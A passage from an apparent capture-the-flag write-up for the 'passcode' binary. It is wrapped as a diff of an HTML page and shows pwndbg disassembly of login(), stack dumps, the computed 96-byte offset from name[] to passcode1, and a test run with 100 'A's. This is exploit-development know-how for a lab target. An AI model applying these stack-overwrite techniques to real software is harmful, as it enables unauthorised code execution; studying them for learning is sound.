+<span id="cb4-107"><a href="#cb4-107" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; disass login</span>
+<span id="cb4-108"><a href="#cb4-108" aria-hidden="true" tabindex="-1"></a>Dump of assembler code for function login:</span>
+<span id="cb4-109"><a href="#cb4-109" aria-hidden="true" tabindex="-1"></a>   0x080491f6 &lt;+0&gt;: push   ebp</span>
+<span id="cb4-110"><a href="#cb4-110" aria-hidden="true" tabindex="-1"></a>   0x080491f7 &lt;+1&gt;: mov    ebp,esp</span>
+<span id="cb4-111"><a href="#cb4-111" aria-hidden="true" tabindex="-1"></a>   0x080491f9 &lt;+3&gt;: push   esi</span>
+<span id="cb4-112"><a href="#cb4-112" aria-hidden="true" tabindex="-1"></a>   0x080491fa &lt;+4&gt;: push   ebx</span>
+<span id="cb4-113"><a href="#cb4-113" aria-hidden="true" tabindex="-1"></a>   0x080491fb &lt;+5&gt;: sub    esp,0x10</span>
+<span id="cb4-114"><a href="#cb4-114" aria-hidden="true" tabindex="-1"></a>   0x080491fe &lt;+8&gt;: call   0x8049130 <span class="dt">&lt;</span><span class="kw">__x86.get_pc_thunk.bx</span><span class="dt">&gt;</span></span>
+<span id="cb4-115"><a href="#cb4-115" aria-hidden="true" tabindex="-1"></a>   0x08049203 &lt;+13&gt;:    add    ebx,0x2dfd</span>
+<span id="cb4-116"><a href="#cb4-116" aria-hidden="true" tabindex="-1"></a>   0x08049209 &lt;+19&gt;:    sub    esp,0xc</span>
+<span id="cb4-117"><a href="#cb4-117" aria-hidden="true" tabindex="-1"></a>   0x0804920c &lt;+22&gt;:    lea    eax,<span class="co">[</span><span class="ot">ebx-0x1ff8</span><span class="co">]</span></span>
+<span id="cb4-118"><a href="#cb4-118" aria-hidden="true" tabindex="-1"></a>   0x08049212 &lt;+28&gt;:    push   eax</span>
+<span id="cb4-119"><a href="#cb4-119" aria-hidden="true" tabindex="-1"></a>   0x08049213 &lt;+29&gt;:    call   0x8049050 &lt;printf@plt&gt;</span>
+<span id="cb4-120"><a href="#cb4-120" aria-hidden="true" tabindex="-1"></a>   0x08049218 &lt;+34&gt;:    add    esp,0x10</span>
+<span id="cb4-121"><a href="#cb4-121" aria-hidden="true" tabindex="-1"></a>   0x0804921b &lt;+37&gt;:    sub    esp,0x8</span>
+<span id="cb4-122"><a href="#cb4-122" aria-hidden="true" tabindex="-1"></a>   0x0804921e &lt;+40&gt;:    push   DWORD PTR <span class="co">[</span><span class="ot">ebp-0x10</span><span class="co">]</span></span>
+<span id="cb4-123"><a href="#cb4-123" aria-hidden="true" tabindex="-1"></a>   0x08049221 &lt;+43&gt;:    lea    eax,<span class="co">[</span><span class="ot">ebx-0x1fe5</span><span class="co">]</span></span>
+<span id="cb4-124"><a href="#cb4-124" aria-hidden="true" tabindex="-1"></a>   0x08049227 &lt;+49&gt;:    push   eax</span>
+<span id="cb4-125"><a href="#cb4-125" aria-hidden="true" tabindex="-1"></a>   0x08049228 &lt;+50&gt;:    call   0x80490d0 &lt;__isoc99_scanf@plt&gt;</span>
+<span id="cb4-126"><a href="#cb4-126" aria-hidden="true" tabindex="-1"></a>   0x0804922d &lt;+55&gt;:    add    esp,0x10</span>
+<span id="cb4-127"><a href="#cb4-127" aria-hidden="true" tabindex="-1"></a>   0x08049230 &lt;+58&gt;:    mov    eax,DWORD PTR <span class="co">[</span><span class="ot">ebx-0x4</span><span class="co">]</span></span>
+<span id="cb4-128"><a href="#cb4-128" aria-hidden="true" tabindex="-1"></a>   0x08049236 &lt;+64&gt;:    mov    eax,DWORD PTR <span class="co">[</span><span class="ot">eax</span><span class="co">]</span></span>
+<span id="cb4-129"><a href="#cb4-129" aria-hidden="true" tabindex="-1"></a>   0x08049238 &lt;+66&gt;:    sub    esp,0xc</span>
+<span id="cb4-130"><a href="#cb4-130" aria-hidden="true" tabindex="-1"></a>   0x0804923b &lt;+69&gt;:    push   eax</span>
+<span id="cb4-131"><a href="#cb4-131" aria-hidden="true" tabindex="-1"></a>   0x0804923c &lt;+70&gt;:    call   0x8049060 &lt;fflush@plt&gt;</span>
+<span id="cb4-132"><a href="#cb4-132" aria-hidden="true" tabindex="-1"></a>   0x08049241 &lt;+75&gt;:    add    esp,0x10</span>
+<span id="cb4-133"><a href="#cb4-133" aria-hidden="true" tabindex="-1"></a>   0x08049244 &lt;+78&gt;:    sub    esp,0xc</span>
+<span id="cb4-134"><a href="#cb4-134" aria-hidden="true" tabindex="-1"></a>   0x08049247 &lt;+81&gt;:    lea    eax,<span class="co">[</span><span class="ot">ebx-0x1fe2</span><span class="co">]</span></span>
+<span id="cb4-135"><a href="#cb4-135" aria-hidden="true" tabindex="-1"></a>   0x0804924d &lt;+87&gt;:    push   eax</span>
+<span id="cb4-136"><a href="#cb4-136" aria-hidden="true" tabindex="-1"></a>   0x0804924e &lt;+88&gt;:    call   0x8049050 &lt;printf@plt&gt;</span>
+<span id="cb4-137"><a href="#cb4-137" aria-hidden="true" tabindex="-1"></a>   0x08049253 &lt;+93&gt;:    add    esp,0x10</span>
+<span id="cb4-138"><a href="#cb4-138" aria-hidden="true" tabindex="-1"></a>   0x08049256 &lt;+96&gt;:    sub    esp,0x8</span>
+<span id="cb4-139"><a href="#cb4-139" aria-hidden="true" tabindex="-1"></a>   0x08049259 &lt;+99&gt;:    push   DWORD PTR <span class="co">[</span><span class="ot">ebp-0xc</span><span class="co">]</span></span>
+<span id="cb4-140"><a href="#cb4-140" aria-hidden="true" tabindex="-1"></a>   0x0804925c &lt;+102&gt;:   lea    eax,<span class="co">[</span><span class="ot">ebx-0x1fe5</span><span class="co">]</span></span>
+<span id="cb4-141"><a href="#cb4-141" aria-hidden="true" tabindex="-1"></a>   0x08049262 &lt;+108&gt;:   push   eax</span>
+<span id="cb4-142"><a href="#cb4-142" aria-hidden="true" tabindex="-1"></a>   0x08049263 &lt;+109&gt;:   call   0x80490d0 &lt;__isoc99_scanf@plt&gt;</span>
+<span id="cb4-143"><a href="#cb4-143" aria-hidden="true" tabindex="-1"></a>   0x08049268 &lt;+114&gt;:   add    esp,0x10</span>
+<span id="cb4-144"><a href="#cb4-144" aria-hidden="true" tabindex="-1"></a>   0x0804926b &lt;+117&gt;:   sub    esp,0xc</span>
+<span id="cb4-145"><a href="#cb4-145" aria-hidden="true" tabindex="-1"></a>   0x0804926e &lt;+120&gt;:   lea    eax,<span class="co">[</span><span class="ot">ebx-0x1fcf</span><span class="co">]</span></span>
+<span id="cb4-146"><a href="#cb4-146" aria-hidden="true" tabindex="-1"></a>   0x08049274 &lt;+126&gt;:   push   eax</span>
+<span id="cb4-147"><a href="#cb4-147" aria-hidden="true" tabindex="-1"></a>   0x08049275 &lt;+127&gt;:   call   0x8049090 &lt;puts@plt&gt;</span>
+<span id="cb4-148"><a href="#cb4-148" aria-hidden="true" tabindex="-1"></a>   0x0804927a &lt;+132&gt;:   add    esp,0x10</span>
+<span id="cb4-149"><a href="#cb4-149" aria-hidden="true" tabindex="-1"></a>   0x0804927d &lt;+135&gt;:   cmp    DWORD PTR <span class="co">[</span><span class="ot">ebp-0x10</span><span class="co">]</span>,0x1e240</span>
+<span id="cb4-150"><a href="#cb4-150" aria-hidden="true" tabindex="-1"></a>   0x08049284 &lt;+142&gt;:   jne    0x80492ce &lt;login+216&gt;</span>
+<span id="cb4-151"><a href="#cb4-151" aria-hidden="true" tabindex="-1"></a>   0x08049286 &lt;+144&gt;:   cmp    DWORD PTR <span class="co">[</span><span class="ot">ebp-0xc</span><span class="co">]</span>,0xcc07c9</span>
+<span id="cb4-152"><a href="#cb4-152" aria-hidden="true" tabindex="-1"></a>   0x0804928d &lt;+151&gt;:   jne    0x80492ce &lt;login+216&gt;</span>
+<span id="cb4-153"><a href="#cb4-153" aria-hidden="true" tabindex="-1"></a>   0x0804928f &lt;+153&gt;:   sub    esp,0xc</span>
+<span id="cb4-154"><a href="#cb4-154" aria-hidden="true" tabindex="-1"></a>   0x08049292 &lt;+156&gt;:   lea    eax,<span class="co">[</span><span class="ot">ebx-0x1fc3</span><span class="co">]</span></span>
+<span id="cb4-155"><a href="#cb4-155" aria-hidden="true" tabindex="-1"></a>   0x08049298 &lt;+162&gt;:   push   eax</span>
+<span id="cb4-156"><a href="#cb4-156" aria-hidden="true" tabindex="-1"></a>   0x08049299 &lt;+163&gt;:   call   0x8049090 &lt;puts@plt&gt;</span>
+<span id="cb4-157"><a href="#cb4-157" aria-hidden="true" tabindex="-1"></a>   0x0804929e &lt;+168&gt;:   add    esp,0x10</span>
+<span id="cb4-158"><a href="#cb4-158" aria-hidden="true" tabindex="-1"></a>   0x080492a1 &lt;+171&gt;:   call   0x8049080 &lt;getegid@plt&gt;</span>
+<span id="cb4-159"><a href="#cb4-159" aria-hidden="true" tabindex="-1"></a>   0x080492a6 &lt;+176&gt;:   mov    esi,eax</span>
+<span id="cb4-160"><a href="#cb4-160" aria-hidden="true" tabindex="-1"></a>   0x080492a8 &lt;+178&gt;:   call   0x8049080 &lt;getegid@plt&gt;</span>
+<span id="cb4-161"><a href="#cb4-161" aria-hidden="true" tabindex="-1"></a>   0x080492ad &lt;+183&gt;:   sub    esp,0x8</span>
+<span id="cb4-162"><a href="#cb4-162" aria-hidden="true" tabindex="-1"></a>   0x080492b0 &lt;+186&gt;:   push   esi</span>
+<span id="cb4-163"><a href="#cb4-163" aria-hidden="true" tabindex="-1"></a>   0x080492b1 &lt;+187&gt;:   push   eax</span>
+<span id="cb4-164"><a href="#cb4-164" aria-hidden="true" tabindex="-1"></a>   0x080492b2 &lt;+188&gt;:   call   0x80490c0 &lt;setregid@plt&gt;</span>
+<span id="cb4-165"><a href="#cb4-165" aria-hidden="true" tabindex="-1"></a>   0x080492b7 &lt;+193&gt;:   add    esp,0x10</span>
+<span id="cb4-166"><a href="#cb4-166" aria-hidden="true" tabindex="-1"></a>   0x080492ba &lt;+196&gt;:   sub    esp,0xc</span>
+<span id="cb4-167"><a href="#cb4-167" aria-hidden="true" tabindex="-1"></a>   0x080492bd &lt;+199&gt;:   lea    eax,<span class="co">[</span><span class="ot">ebx-0x1fb9</span><span class="co">]</span></span>
+<span id="cb4-168"><a href="#cb4-168" aria-hidden="true" tabindex="-1"></a>   0x080492c3 &lt;+205&gt;:   push   eax</span>
+<span id="cb4-169"><a href="#cb4-169" aria-hidden="true" tabindex="-1"></a>   0x080492c4 &lt;+206&gt;:   call   0x80490a0 &lt;system@plt&gt;</span>
+<span id="cb4-170"><a href="#cb4-170" aria-hidden="true" tabindex="-1"></a>   0x080492c9 &lt;+211&gt;:   add    esp,0x10</span>
+<span id="cb4-171"><a href="#cb4-171" aria-hidden="true" tabindex="-1"></a>   0x080492cc &lt;+214&gt;:   jmp    0x80492ea &lt;login+244&gt;</span>
+<span id="cb4-172"><a href="#cb4-172" aria-hidden="true" tabindex="-1"></a>   0x080492ce &lt;+216&gt;:   sub    esp,0xc</span>
+<span id="cb4-173"><a href="#cb4-173" aria-hidden="true" tabindex="-1"></a>   0x080492d1 &lt;+219&gt;:   lea    eax,<span class="co">[</span><span class="ot">ebx-0x1fab</span><span class="co">]</span></span>
+<span id="cb4-174"><a href="#cb4-174" aria-hidden="true" tabindex="-1"></a>   0x080492d7 &lt;+225&gt;:   push   eax</span>
+<span id="cb4-175"><a href="#cb4-175" aria-hidden="true" tabindex="-1"></a>   0x080492d8 &lt;+226&gt;:   call   0x8049090 &lt;puts@plt&gt;</span>
+<span id="cb4-176"><a href="#cb4-176" aria-hidden="true" tabindex="-1"></a>   0x080492dd &lt;+231&gt;:   add    esp,0x10</span>
+<span id="cb4-177"><a href="#cb4-177" aria-hidden="true" tabindex="-1"></a>   0x080492e0 &lt;+234&gt;:   sub    esp,0xc</span>
+<span id="cb4-178"><a href="#cb4-178" aria-hidden="true" tabindex="-1"></a>   0x080492e3 &lt;+237&gt;:   push   0x0</span>
+<span id="cb4-179"><a href="#cb4-179" aria-hidden="true" tabindex="-1"></a>   0x080492e5 &lt;+239&gt;:   call   0x80490b0 &lt;exit@plt&gt;</span>
+<span id="cb4-180"><a href="#cb4-180" aria-hidden="true" tabindex="-1"></a>   0x080492ea &lt;+244&gt;:   nop</span>
+<span id="cb4-181"><a href="#cb4-181" aria-hidden="true" tabindex="-1"></a>   0x080492eb &lt;+245&gt;:   lea    esp,<span class="co">[</span><span class="ot">ebp-0x8</span><span class="co">]</span></span>
+<span id="cb4-182"><a href="#cb4-182" aria-hidden="true" tabindex="-1"></a>   0x080492ee &lt;+248&gt;:   pop    ebx</span>
+<span id="cb4-183"><a href="#cb4-183" aria-hidden="true" tabindex="-1"></a>   0x080492ef &lt;+249&gt;:   pop    esi</span>
+<span id="cb4-184"><a href="#cb4-184" aria-hidden="true" tabindex="-1"></a>   0x080492f0 &lt;+250&gt;:   pop    ebp</span>
+<span id="cb4-185"><a href="#cb4-185" aria-hidden="true" tabindex="-1"></a>   0x080492f1 &lt;+251&gt;:   ret</span>
+<span id="cb4-186"><a href="#cb4-186" aria-hidden="true" tabindex="-1"></a>End of assembler dump.</span>
+<span id="cb4-187"><a href="#cb4-187" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; b *login + 40</span>
+<span id="cb4-188"><a href="#cb4-188" aria-hidden="true" tabindex="-1"></a>Breakpoint 2 at 0x804921e</span>
+<span id="cb4-189"><a href="#cb4-189" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; c</span>
+<span id="cb4-190"><a href="#cb4-190" aria-hidden="true" tabindex="-1"></a>Continuing.</span>
+<span id="cb4-191"><a href="#cb4-191" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-192"><a href="#cb4-192" aria-hidden="true" tabindex="-1"></a>Breakpoint 2, 0x0804921e in login ()</span>
+<span id="cb4-193"><a href="#cb4-193" aria-hidden="true" tabindex="-1"></a>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span>
+<span id="cb4-194"><a href="#cb4-194" aria-hidden="true" tabindex="-1"></a>──────────────────────────────<span class="co">[</span><span class="ot"> REGISTERS / show-flags off / show-compact-regs off </span><span class="co">]</span>──────────────────────────────</span>
+<span id="cb4-195"><a href="#cb4-195" aria-hidden="true" tabindex="-1"></a>*EAX  0x12</span>
+<span id="cb4-196"><a href="#cb4-196" aria-hidden="true" tabindex="-1"></a> EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1</span>
+<span id="cb4-197"><a href="#cb4-197" aria-hidden="true" tabindex="-1"></a>*ECX  0xf7f81000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span>
+<span id="cb4-198"><a href="#cb4-198" aria-hidden="true" tabindex="-1"></a> EDX  0</span>
+<span id="cb4-199"><a href="#cb4-199" aria-hidden="true" tabindex="-1"></a> EDI  0xf7fd6b80 (_rtld_global_ro) ◂— 0</span>
+<span id="cb4-200"><a href="#cb4-200" aria-hidden="true" tabindex="-1"></a> ESI  0xffad9874 —▸ 0xffadad62 ◂— &#39;/home/passcode/passcode&#39;</span>
+<span id="cb4-201"><a href="#cb4-201" aria-hidden="true" tabindex="-1"></a> EBP  0xffad9798 —▸ 0xffad97a8 —▸ 0xf7fd7020 (_rtld_global) —▸ 0xf7fd7a40 ◂— 0</span>
+<span id="cb4-202"><a href="#cb4-202" aria-hidden="true" tabindex="-1"></a>*ESP  0xffad9778 —▸ 0xffad97e0 —▸ 0xf7f81000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span>
+<span id="cb4-203"><a href="#cb4-203" aria-hidden="true" tabindex="-1"></a>*EIP  0x804921e (login+40) ◂— push dword ptr <span class="co">[</span><span class="ot">ebp - 0x10</span><span class="co">]</span></span>
+<span id="cb4-204"><a href="#cb4-204" aria-hidden="true" tabindex="-1"></a>───────────────────────────────────────<span class="co">[</span><span class="ot"> DISASM / i386 / set emulate off </span><span class="co">]</span>────────────────────────────────────────</span>
+<span id="cb4-205"><a href="#cb4-205" aria-hidden="true" tabindex="-1"></a> ► 0x804921e &lt;login+40&gt;    push   dword ptr <span class="co">[</span><span class="ot">ebp - 0x10</span><span class="co">]</span></span>
+<span id="cb4-206"><a href="#cb4-206" aria-hidden="true" tabindex="-1"></a>   0x8049221 &lt;login+43&gt;    lea    eax, <span class="co">[</span><span class="ot">ebx - 0x1fe5</span><span class="co">]</span></span>
+<span id="cb4-207"><a href="#cb4-207" aria-hidden="true" tabindex="-1"></a>   0x8049227 &lt;login+49&gt;    push   eax</span>
+<span id="cb4-208"><a href="#cb4-208" aria-hidden="true" tabindex="-1"></a>   0x8049228 &lt;login+50&gt;    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt;</span>
+<span id="cb4-209"><a href="#cb4-209" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-210"><a href="#cb4-210" aria-hidden="true" tabindex="-1"></a>   0x804922d &lt;login+55&gt;    add    esp, 0x10</span>
+<span id="cb4-211"><a href="#cb4-211" aria-hidden="true" tabindex="-1"></a>   0x8049230 &lt;login+58&gt;    mov    eax, dword ptr <span class="co">[</span><span class="ot">ebx - 4</span><span class="co">]</span></span>
+<span id="cb4-212"><a href="#cb4-212" aria-hidden="true" tabindex="-1"></a>   0x8049236 &lt;login+64&gt;    mov    eax, dword ptr <span class="co">[</span><span class="ot">eax</span><span class="co">]</span></span>
+<span id="cb4-213"><a href="#cb4-213" aria-hidden="true" tabindex="-1"></a>   0x8049238 &lt;login+66&gt;    sub    esp, 0xc</span>
+<span id="cb4-214"><a href="#cb4-214" aria-hidden="true" tabindex="-1"></a>   0x804923b &lt;login+69&gt;    push   eax</span>
+<span id="cb4-215"><a href="#cb4-215" aria-hidden="true" tabindex="-1"></a>   0x804923c &lt;login+70&gt;    call   fflush@plt                  &lt;fflush@plt&gt;</span>
+<span id="cb4-216"><a href="#cb4-216" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-217"><a href="#cb4-217" aria-hidden="true" tabindex="-1"></a>   0x8049241 &lt;login+75&gt;    add    esp, 0x10</span>
+<span id="cb4-218"><a href="#cb4-218" aria-hidden="true" tabindex="-1"></a>────────────────────────────────────────────────────<span class="co">[</span><span class="ot"> STACK </span><span class="co">]</span>─────────────────────────────────────────────────────</span>
+<span id="cb4-219"><a href="#cb4-219" aria-hidden="true" tabindex="-1"></a>00:0000│ esp 0xffad9778 —▸ 0xffad97e0 —▸ 0xf7f81000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span>
+<span id="cb4-220"><a href="#cb4-220" aria-hidden="true" tabindex="-1"></a>01:0004│-01c 0xffad977c —▸ 0x8049203 (login+13) ◂— add ebx, 0x2dfd</span>
+<span id="cb4-221"><a href="#cb4-221" aria-hidden="true" tabindex="-1"></a>02:0008│-018 0xffad9780 —▸ 0xffad9874 —▸ 0xffadad62 ◂— &#39;/home/passcode/passcode&#39;</span>
+<span id="cb4-222"><a href="#cb4-222" aria-hidden="true" tabindex="-1"></a>03:000c│-014 0xffad9784 —▸ 0xf7fd6b80 (_rtld_global_ro) ◂— 0</span>
+<span id="cb4-223"><a href="#cb4-223" aria-hidden="true" tabindex="-1"></a>04:0010│-010 0xffad9788 —▸ 0xffad97a8 —▸ 0xf7fd7020 (_rtld_global) —▸ 0xf7fd7a40 ◂— 0</span>
+<span id="cb4-224"><a href="#cb4-224" aria-hidden="true" tabindex="-1"></a>05:0014│-00c 0xffad978c ◂— 0x3ef8a600</span>
+<span id="cb4-225"><a href="#cb4-225" aria-hidden="true" tabindex="-1"></a>06:0018│-008 0xffad9790 —▸ 0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1</span>
+<span id="cb4-226"><a href="#cb4-226" aria-hidden="true" tabindex="-1"></a>07:001c│-004 0xffad9794 —▸ 0xffad9874 —▸ 0xffadad62 ◂— &#39;/home/passcode/passcode&#39;</span>
+<span id="cb4-227"><a href="#cb4-227" aria-hidden="true" tabindex="-1"></a>──────────────────────────────────────────────────<span class="co">[</span><span class="ot"> BACKTRACE </span><span class="co">]</span>───────────────────────────────────────────────────</span>
+<span id="cb4-228"><a href="#cb4-228" aria-hidden="true" tabindex="-1"></a> ► 0 0x804921e login+40</span>
+<span id="cb4-229"><a href="#cb4-229" aria-hidden="true" tabindex="-1"></a>   1 0x804939a main+54</span>
+<span id="cb4-230"><a href="#cb4-230" aria-hidden="true" tabindex="-1"></a>   2 0xf7d78519 __libc_start_call_main+121</span>
+<span id="cb4-231"><a href="#cb4-231" aria-hidden="true" tabindex="-1"></a>   3 0xf7d785f3 __libc_start_main+147</span>
+<span id="cb4-232"><a href="#cb4-232" aria-hidden="true" tabindex="-1"></a>   4 0x804910c _start+44</span>
+<span id="cb4-233"><a href="#cb4-233" aria-hidden="true" tabindex="-1"></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+<span id="cb4-234"><a href="#cb4-234" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; x/32xw $ebp - 0x10</span>
+<span id="cb4-235"><a href="#cb4-235" aria-hidden="true" tabindex="-1"></a>0xffad9788: 0xffad97a8  0x3ef8a600  0x0804c000  0xffad9874</span>
+<span id="cb4-236"><a href="#cb4-236" aria-hidden="true" tabindex="-1"></a>0xffad9798: 0xffad97a8  0x0804939a  0xffad97c0  0xf7f81000</span>
+<span id="cb4-237"><a href="#cb4-237" aria-hidden="true" tabindex="-1"></a>0xffad97a8: 0xf7fd7020  0xf7d78519  0xffadad62  0x00000070</span>
+<span id="cb4-238"><a href="#cb4-238" aria-hidden="true" tabindex="-1"></a>0xffad97b8: 0xf7fd7000  0xf7d78519  0x00000001  0xffad9874</span>
+<span id="cb4-239"><a href="#cb4-239" aria-hidden="true" tabindex="-1"></a>0xffad97c8: 0xffad987c  0xffad97e0  0xf7f81000  0x08049364</span>
+<span id="cb4-240"><a href="#cb4-240" aria-hidden="true" tabindex="-1"></a>0xffad97d8: 0x00000001  0xffad9874  0xf7f81000  0xffad9874</span>
+<span id="cb4-241"><a href="#cb4-241" aria-hidden="true" tabindex="-1"></a>0xffad97e8: 0xf7fd6b80  0xf7fd7020  0x720a3e61  0x862c1471</span>
+<span id="cb4-242"><a href="#cb4-242" aria-hidden="true" tabindex="-1"></a>0xffad97f8: 0x00000000  0x00000000  0x00000000  0xf7fd6b80</span>
+<span id="cb4-243"><a href="#cb4-243" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; p $ebp - 0x10 - $1</span>
+<span id="cb4-244"><a href="#cb4-244" aria-hidden="true" tabindex="-1"></a>$2 = (void *) 0x60</span>
+<span id="cb4-245"><a href="#cb4-245" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; p 0x60</span>
+<span id="cb4-246"><a href="#cb4-246" aria-hidden="true" tabindex="-1"></a>$3 = 96</span></code></pre></div>
+<p>the buffer is easy to find in <code>welcome()</code>’s stack frame:
+<code>0x41414141 0x41414141</code> at <code>0xffad9720</code>.
+<code>passcode1</code> can be located by looking at the base pointer.
+the following instruction pushes the 4-byte dereferenced value of
+<code>ebp - 0x10</code> on the stack, and corresponds to
+<code>passcode1</code> actually being read as an argument to
+<code>scanf()</code>:</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>0x0804921e &lt;+40&gt;:   push   DWORD PTR <span class="co">[</span><span class="ot">ebp-0x10</span><span class="co">]</span></span></code></pre></div>
+<p><code>passcode1</code> is 96 bytes offset from <code>name[]</code>,
+even though the buffer size is 100. let’s try filling the buffer with
+A’s.</p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; r &lt; &lt;(perl -e &#39;print &quot;A&quot;x100&#39;)</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>Starting program: /home/passcode/passcode &lt; &lt;(perl -e &#39;print &quot;A&quot;x100&#39;)</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="co">[</span><span class="ot">Thread debugging using libthread_db enabled</span><span class="co">]</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>Toddler&#39;s Secure Login System 1.1 beta.</span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>Breakpoint 1, 0x08049362 in welcome ()</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>──────────────────────────────<span class="co">[</span><span class="ot"> REGISTERS / show-flags off / show-compact-regs off </span><span class="co">]</span>──────────────────────────────</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a> EAX  0</span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a> EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1</span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a> ECX  0</span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a> EDX  0</span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a> EDI  0xf7f2eb80 (_rtld_global_ro) ◂— 0</span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a> ESI  0xffae9a74 —▸ 0xffae9d62 ◂— &#39;/home/passcode/passcode&#39;</span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a> EBP  0xffae9998 —▸ 0xffae99a8 —▸ 0xf7f2f020 (_rtld_global) —▸ 0xf7f2fa40 ◂— 0</span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a> ESP  0xffae9920 —▸ 0xf7ed9da0 (_IO_2_1_stdout_) ◂— 0xfbad2a84</span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a> EIP  0x8049362 (welcome+112) ◂— leave</span>
+<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a>───────────────────────────────────────<span class="co">[</span><span class="ot"> DISASM / i386 / set emulate off </span><span class="co">]</span>────────────────────────────────────────</span>
+<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a> ► 0x8049362 &lt;welcome+112&gt;    leave</span>
+<span id="cb6-22"><a href="#cb6-22" aria-hidden="true" tabindex="-1"></a>   0x8049363 &lt;welcome+113&gt;    ret</span>
+<span id="cb6-23"><a href="#cb6-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-24"><a href="#cb6-24" aria-hidden="true" tabindex="-1"></a>   0x8049364 <span class="dt">&lt;</span><span class="kw">main</span><span class="dt">&gt;</span>           lea    ecx, <span class="co">[</span><span class="ot">esp + 4</span><span class="co">]</span></span>
+<span id="cb6-25"><a href="#cb6-25" aria-hidden="true" tabindex="-1"></a>   0x8049368 &lt;main+4&gt;         and    esp, 0xfffffff0</span>
+<span id="cb6-26"><a href="#cb6-26" aria-hidden="true" tabindex="-1"></a>   0x804936b &lt;main+7&gt;         push   dword ptr <span class="co">[</span><span class="ot">ecx - 4</span><span class="co">]</span></span>
+<span id="cb6-27"><a href="#cb6-27" aria-hidden="true" tabindex="-1"></a>   0x804936e &lt;main+10&gt;        push   ebp</span>
+<span id="cb6-28"><a href="#cb6-28" aria-hidden="true" tabindex="-1"></a>   0x804936f &lt;main+11&gt;        mov    ebp, esp</span>
+<span id="cb6-29"><a href="#cb6-29" aria-hidden="true" tabindex="-1"></a>   0x8049371 &lt;main+13&gt;        push   ebx</span>
+<span id="cb6-30"><a href="#cb6-30" aria-hidden="true" tabindex="-1"></a>   0x8049372 &lt;main+14&gt;        push   ecx</span>
+<span id="cb6-31"><a href="#cb6-31" aria-hidden="true" tabindex="-1"></a>   0x8049373 &lt;main+15&gt;        call   __x86.get_pc_thunk.bx       &lt;__x86.get_pc_thunk.bx&gt;</span>
+<span id="cb6-32"><a href="#cb6-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-33"><a href="#cb6-33" aria-hidden="true" tabindex="-1"></a>   0x8049378 &lt;main+20&gt;        add    ebx, 0x2c88</span>
+<span id="cb6-34"><a href="#cb6-34" aria-hidden="true" tabindex="-1"></a>────────────────────────────────────────────────────<span class="co">[</span><span class="ot"> STACK </span><span class="co">]</span>─────────────────────────────────────────────────────</span>
+<span id="cb6-35"><a href="#cb6-35" aria-hidden="true" tabindex="-1"></a>00:0000│ esp 0xffae9920 —▸ 0xf7ed9da0 (_IO_2_1_stdout_) ◂— 0xfbad2a84</span>
